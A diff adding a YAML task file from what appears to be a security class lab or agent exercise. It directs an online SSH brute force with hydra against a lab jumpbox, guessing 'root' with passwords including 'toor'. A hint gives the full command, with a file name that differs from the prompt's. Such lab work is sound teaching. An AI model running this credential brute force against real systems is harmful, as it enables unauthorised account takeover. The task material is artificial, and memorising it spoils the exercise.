@@ -1,0 +1,21 @@
+id: "04"
+title: "Online brute force: SSH against the jumpbox"
+prompt: |
+  hydra against p-jumpbox-01 (172.16.10.13). Careful and slow on purpose.
+
+  1. Create a tiny username file ~/kali-class-work/sec-wk09/users.txt with
+     one line: root
+  2. Create a small password file ~/kali-class-work/sec-wk09/passwords.txt
+     with a few guesses (include 'toor')
+  3. Run hydra SSH:
+     hydra -L <userfile> -P <passfile> 172.16.10.13 -t 4 ssh
+  4. Save output to ~/kali-class-work/sec-wk08/../sec-wk09/hydra-ssh.txt
+     (that is: ~/kali-class-work/sec-wk09/hydra-ssh.txt)
+  5. Stamp: kali-class stamp sec-wk09 hydra-ssh
+hints:
+  - "hydra -L ~/kali-class-work/sec-wk09/usernames.txt -P ~/kali-class-work/sec-wk09/passwords.txt 172.16.10.13 -t 4 ssh"
+  - "Low thread count (-t 4) keeps you from locking yourself out of the lab."
+verify:
+  script: "04-hydra-ssh.verify.sh"
+  timeout: 180
+on_success: "A live SSH credential found by brute force. Rate-limiting matters."
